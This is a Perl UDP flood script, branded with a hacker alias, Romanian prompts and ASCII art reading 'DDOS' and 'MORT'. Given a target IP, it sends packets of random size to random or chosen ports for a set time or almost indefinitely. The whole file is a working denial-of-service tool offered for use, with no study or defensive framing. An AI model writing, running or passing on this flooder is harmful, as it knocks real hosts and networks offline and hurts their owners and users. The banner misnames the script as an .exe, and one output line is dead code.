#!/usr/bin/perl
use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(
	"port=i" => \$port,

	"size=i" => \$size,

	"bandwidth=i" => \$bw,

	"time=i" => \$time,

	"delay=f"=> \$delay,

	"help|?" => \$help);


my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';





































          ########################################
          #         ARHIVA BY R00T_S!GM4         #
          ########################################
          #                                      #
          #        perl rootsigma.exe ip         #
          #                                      #
          ########################################














EOL
  exit(1);
}

if ($bw && $delay) {
  print "WARNING: Dimensiunea pachetului suprascrie parametrul --marime ignorata\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 256 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Nu se poate conecta la hostname-ul: $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "\n";
printf "        ,..,.....,\n";
printf "       ,...........,                  \n";
printf "      ,.............,                                .,.     \n";
printf "     ,.....,....,....,                               ,., .,  .,..,.....,,...,.,.,,\n";
printf "    ......,...,..,....,                              ..,,.., .DDOS,.....,..MORT...,.,...,,\n";
printf "    ,,..,..,        .,..                             .,..,..,.,.,...,,.,,,,,.,..,....,......,.....,..\n";
printf "    .,...,.          .,,                             ,.. .,,                     ....,..,...,.......,....,..\n";
printf "    ,..,.             ,..                             ...                                            ..,......,..\n";
printf "   ...,               .,.                          .,.,.,.,.  \n";
printf " ......,             ..,.                         ,..,, .  ,.\n";
printf ".....,....        ..,..,.                           .,   ,   .\n";
printf ",,.........,...,..,,......                           .,.\n";
printf ".,....,........,....,.,...,                          ..,\n";
printf "...,...,.....,...,.........,                         ,.,\n";
printf ",,....,......,,........,..,,,,                       ...\n";
printf "..,.......,...........,..,..,,,,,                    .,.\n";
printf ",...,.,.......,....,.....,...,,,,,,,,                ,.,\n";
printf ".,....,........,.,.,.,,.,,.,.....,,,,,,,,,,          ,.,\n";
printf ".,.,.......,...........,............,..,,,,,..,.,,,,,,,,.\n";
printf "............,.........,..,..................,...,,,,,,,,,...\n";
printf ".,.......,..........,...,...........,....,........,,,,,.....\n";
printf "....,...................,.............,.....,,,,,..,......\n";
printf ".,............,,..,,...............,..,,,,           .,.\n";
printf ".,......,.......,.........,........,,,,,,            .,.\n";
printf "........,.................,......,,,,,,              ..,\n";
printf "\n";
printf "[0;34mARHIVA \e[0;33mBY \e[0;31mR00T_S!GM4\n";
printf "[0;34mIP \e[0;33mATACAT \e[0;31m$ip\n";
($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
print "Interpacket delay $delay msec\n" if $delay;
print "total IP bandwidth $bw kbps\n" if $bw;

die "Marime pachet invalida: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}
